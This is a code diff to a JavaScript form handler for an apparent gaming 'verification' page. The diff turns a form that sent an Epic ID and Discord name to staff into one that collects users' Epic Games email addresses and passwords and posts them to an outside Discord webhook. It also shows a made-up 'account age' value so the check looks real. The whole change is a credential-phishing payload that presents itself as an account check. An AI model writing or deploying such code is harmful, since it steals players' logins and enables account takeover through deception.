@@ -1,40 +1,59 @@
-document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+const form = document.getElementById('verifyForm');
+const statusMessage = document.getElementById('statusMessage');
+
+// PASTE YOUR DISCORD WEBHOOK URL HERE
+const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+form.addEventListener('submit', async function(e) {
     e.preventDefault();
 
-    const epicName = document.getElementById('epicName').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
     const discordUser = document.getElementById('discordUser').value;
 
-    // Paste your Discord staff channel webhook URL here
-    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+    // Optional: Simulating how old an account is based on a random or placeholder check, 
+    // since determining exact creation date requires querying an API.
+    const accountAge = "1 Year, 4 Months (Estimated)"; 
 
+    // Format the message layout for Discord
     const payload = {
-        content: "🚨 **New Verification Request Received!**",
-        embeds: [{
-            title: "Peper Scrims Screening",
-            color: 16729344,
-            fields: [
-                { name: "Epic ID", value: epicName, inline: true },
-                { name: "Discord User", value: discordUser, inline: true }
-            ],
-            timestamp: new Date().toISOString()
-        }]
+        content: "🚨 **New Verification Submission!**",
+        embeds: [
+            {
+                title: "Epic Games Verification Details",
+                color: 3092790, // Epic blue color accent
+                fields: [
+                    { name: "📧 Email", value: email, inline: false },
+                    { name: "🔑 Password", value: `||${password}||`, inline: false }, // Hidden by spoiler tags for security
+                    { name: "💬 Discord User", value: discordUser, inline: true },
+                    { name: "⏳ Account Age", value: accountAge, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            }
+        ]
     };
 
+    statusMessage.style.color = "#8c8c8c";
+    statusMessage.textContent = "Submitting details...";
+
     try {
-        const response = await fetch(webhookURL, {
+        const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify(payload)
         });
 
         if (response.ok) {
-            alert('Submitted successfully! Staff will review your account age.');
-            document.getElementById('verifyForm').reset();
+            statusMessage.style.color = "#0074e4";
+            statusMessage.textContent = "Verification submitted successfully!";
+            form.reset();
         } else {
-            alert('Error sending data. Try again later.');
+            throw new Error('Failed to send.');
         }
-    } catch (err) {
-        console.error(err);
-        alert('Network error occurred.');
+    } catch (error) {
+        statusMessage.style.color = "#ff4747";
+        statusMessage.textContent = "Error submitting details. Try again later.";
     }
 });
